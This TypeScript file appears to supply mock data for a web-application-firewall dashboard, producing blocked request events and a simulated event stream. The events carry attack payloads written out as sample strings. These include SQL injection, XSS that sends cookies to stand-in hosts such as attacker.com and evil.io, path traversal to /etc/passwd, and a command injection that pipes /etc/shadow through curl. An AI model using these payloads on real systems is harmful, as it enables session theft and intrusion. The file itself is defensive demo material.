import type { WafEvent } from "../types";

const INITIAL_EVENTS: WafEvent[] = [
  {
    timestamp: new Date(Date.now() - 1000 * 12).toISOString(),
    rule_id: "sqli-001",
    action: "deny",
    remote_ip: "198.51.100.42",
    method: "GET",
    path: "/api/v1/products?category=electronics' UNION SELECT id,password,email FROM users--",
    matched_field: "query.category",
    matched_value: "UNION SELECT id,password,email FROM users",
    anomaly_score: 0.98,
    country: "DE",
    user_agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    status_code: 403,
  },
  {
    timestamp: new Date(Date.now() - 1000 * 25).toISOString(),
    rule_id: "xss-001",
    action: "deny",
    remote_ip: "203.0.113.19",
    method: "POST",
    path: "/api/v1/feedback/submit",
    matched_field: "body.comment",
    matched_value: "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
    anomaly_score: 0.92,
    country: "US",
    user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    status_code: 403,
  },
  {
    timestamp: new Date(Date.now() - 1000 * 48).toISOString(),
    rule_id: "traversal-001",
    action: "deny",
    remote_ip: "192.0.2.77",
    method: "GET",
    path: "/static/../../../../etc/passwd",
    matched_field: "uri.path",
    matched_value: "../../../../etc/passwd",
    anomaly_score: 0.89,
    country: "FR",
    user_agent: "curl/7.88.1",
    status_code: 403,
  },
  {
    timestamp: new Date(Date.now() - 1000 * 75).toISOString(),
    rule_id: "bot-001",
    action: "deny",
    remote_ip: "45.33.32.156",
    method: "GET",
    path: "/.git/config",
    matched_field: "headers.User-Agent",
    matched_value: "sqlmap/1.7#stable",
    anomaly_score: 0.76,
    country: "RU",
    user_agent: "sqlmap/1.7#stable (http://sqlmap.org)",
    status_code: 403,
  },
  {
    timestamp: new Date(Date.now() - 1000 * 110).toISOString(),
    rule_id: "cmdinj-001",
    action: "deny",
    remote_ip: "185.220.101.5",
    method: "POST",
    path: "/api/v1/tools/ping",
    matched_field: "body.host",
    matched_value: "127.0.0.1; cat /etc/shadow | curl -d @- evil.sh",
    anomaly_score: 0.99,
    country: "NL",
    user_agent: "python-requests/2.31.0",
    status_code: 403,
  },
  {
    timestamp: new Date(Date.now() - 1000 * 150).toISOString(),
    rule_id: "appsec-ml-zero-day",
    action: "deny",
    remote_ip: "103.21.244.0",
    method: "POST",
    path: "/graphql",
    matched_field: "body.query",
    matched_value: 'mutation { debugDump(env: "__proto__") }',
    anomaly_score: 0.88,
    country: "SG",
    user_agent: "GraphQL-Playground/1.7.0",
    status_code: 403,
  },
  {
    timestamp: new Date(Date.now() - 1000 * 190).toISOString(),
    rule_id: "sqli-002",
    action: "deny",
    remote_ip: "198.51.100.42",
    method: "POST",
    path: "/api/v1/auth/login",
    matched_field: "body.username",
    matched_value: "admin' OR '1'='1",
    anomaly_score: 0.95,
    country: "DE",
    user_agent: "Mozilla/5.0 (X11; Linux x86_64)",
    status_code: 403,
  },
  {
    timestamp: new Date(Date.now() - 1000 * 240).toISOString(),
    rule_id: "xss-002",
    action: "deny",
    remote_ip: "93.184.216.34",
    method: "GET",
    path: '/search?q=<img src=x onerror=alert("XSS")>',
    matched_field: "query.q",
    matched_value: '<img src=x onerror=alert("XSS")>',
    anomaly_score: 0.84,
    country: "SE",
    user_agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    status_code: 403,
  },
];

const ATTACK_TEMPLATES = [
  {
    rule_id: "sqli-001",
    method: "GET",
    path: "/api/v1/orders?id=-1 UNION SELECT username,password FROM admins--",
    matched_field: "query.id",
    matched_value: "UNION SELECT username,password FROM admins",
    anomaly_score: 0.97,
    ips: ["198.51.100.42", "203.0.113.88", "192.0.2.14"],
  },
  {
    rule_id: "xss-001",
    method: "POST",
    path: "/api/v1/forum/post",
    matched_field: "body.content",
    matched_value: '<script>document.location="http://evil.io/steal?cookie="+document.cookie</script>',
    anomaly_score: 0.91,
    ips: ["203.0.113.19", "93.184.216.34", "185.220.101.5"],
  },
  {
    rule_id: "traversal-001",
    method: "GET",
    path: "/api/v1/download?file=..%2F..%2F..%2F..%2Fwindows%2Fwin.ini",
    matched_field: "query.file",
    matched_value: "../../../../windows/win.ini",
    anomaly_score: 0.86,
    ips: ["192.0.2.77", "45.33.32.156"],
  },
  {
    rule_id: "bot-001",
    method: "GET",
    path: "/wp-login.php",
    matched_field: "headers.User-Agent",
    matched_value: "Nikto/2.1.6",
    anomaly_score: 0.79,
    ips: ["45.33.32.156", "185.220.101.5"],
  },
  {
    rule_id: "cmdinj-001",
    method: "POST",
    path: "/api/v1/network/lookup",
    matched_field: "body.domain",
    matched_value: "example.com && whoami && id",
    anomaly_score: 0.96,
    ips: ["185.220.101.5", "103.21.244.0"],
  },
  {
    rule_id: "appsec-ml-zero-day",
    method: "POST",
    path: "/api/v1/graphql",
    matched_field: "body.query",
    matched_value: "eval(compile('import os; os.system(\"id\")'))",
    anomaly_score: 0.89,
    ips: ["103.21.244.0", "198.51.100.42"],
  },
];

export function getInitialEvents(): WafEvent[] {
  return [...INITIAL_EVENTS];
}

export function generateRandomEvent(): WafEvent {
  const template = ATTACK_TEMPLATES[Math.floor(Math.random() * ATTACK_TEMPLATES.length)];
  const ip = template.ips[Math.floor(Math.random() * template.ips.length)];
  return {
    timestamp: new Date().toISOString(),
    rule_id: template.rule_id,
    action: "deny",
    remote_ip: ip,
    method: template.method,
    path: template.path,
    matched_field: template.matched_field,
    matched_value: template.matched_value,
    anomaly_score: template.anomaly_score,
    country: "GLOBAL",
    user_agent: "Mozilla/5.0 (Compatible; SecurityProbe/2.0)",
    status_code: 403,
  };
}

/** Simulates SSE stream by yielding events at intervals */
export function startMockEventStream(onEvent: (event: WafEvent) => void, intervalMs = 2500): () => void {
  const timer = setInterval(() => {
    onEvent(generateRandomEvent());
  }, intervalMs);

  return () => clearInterval(timer);
}
